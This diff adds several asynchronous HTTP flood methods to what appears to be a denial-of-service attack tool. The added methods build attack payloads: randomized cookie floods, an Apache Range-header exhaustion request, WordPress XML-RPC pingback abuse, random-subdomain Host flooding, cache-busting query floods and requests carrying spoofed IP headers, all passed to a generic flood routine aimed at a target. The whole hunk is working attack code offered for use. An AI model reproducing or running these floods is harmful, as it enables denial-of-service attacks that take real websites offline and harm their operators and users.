@@ -956,6 +956,78 @@ class AsyncHttpFlood(HttpFlood):
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
         return await self._generic_flood(payload)
 
+    async def COOKIES(self) -> int:
+        payload: bytes = self.generate_payload(
+            "Cookie: _ga=GA%s;"
+            " _gat=1;"
+            " __cfduid=dc232334gwdsd23434542342342342475611928;"
+            " %s=%s\r\n" %
+            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+             ProxyTools.Random.rand_str(32))
+        )
+        return await self._generic_flood(payload)
+    
+    async def APACHE(self) -> int:
+        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
+        return await self._generic_flood(payload)
+    
+    async def XMLRPC(self) -> int:
+        payload: bytes = self.generate_payload(
+            ("Content-Length: 345\r\n"
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/xml\r\n\r\n"
+             "<?xml version='1.0' encoding='iso-8859-1'?>"
+             "<methodCall><methodName>pingback.ping</methodName>"
+             "<params><param><value><string>%s</string></value>"
+             "</param><param><value><string>%s</string>"
+             "</value></param></params></methodCall>") %
+            (ProxyTools.Random.rand_str(64),
+             ProxyTools.Random.rand_str(64)))[:-2]
+        return await self._generic_flood(payload)
+    
+    async def PPS(self) -> int:
+        return await self._generic_flood(self._defaultpayload)
+    
+    async def DYN(self) -> int:
+        payload: bytes = str.encode(
+            self._payload +
+            "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+            self.randHeadercontent +
+            "\r\n"
+        )
+        return await self._generic_flood(payload)
+    
+    async def GSB(self) -> int:
+        payload: bytes = str.encode(
+            "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+                                          self._target.raw_path_qs,
+                                          ProxyTools.Random.rand_str(6)) +
+            "Host: %s\r\n" % self._target.authority +
+            self.randHeadercontent +
+            'Accept-Encoding: gzip, deflate, br\r\n'
+            'Accept-Language: en-US,en;q=0.9\r\n'
+            'Cache-Control: max-age=0\r\n'
+            'Connection: Keep-Alive\r\n'
+            'Sec-Fetch-Dest: document\r\n'
+            'Sec-Fetch-Mode: navigate\r\n'
+            'Sec-Fetch-Site: none\r\n'
+            'Sec-Fetch-User: ?1\r\n'
+            'Sec-Gpc: 1\r\n'
+            'Pragma: no-cache\r\n'
+            'Upgrade-Insecure-Requests: 1\r\n\r\n'
+        )
+        return await self._generic_flood(payload)
+    
+    async def NULL(self) -> int:
+        payload: bytes = str.encode(
+            self._payload +
+            "Host: %s\r\n" % self._target.authority +
+            "User-Agent: null\r\n" +
+            "Referrer: null\r\n" +
+            self.SpoofIP + "\r\n"
+        )
+        return await self._generic_flood(payload)
+
 
 # XXX: the separation should be based on the socket type: TCP vs. UDP
 class AsyncLayer4(Layer4):
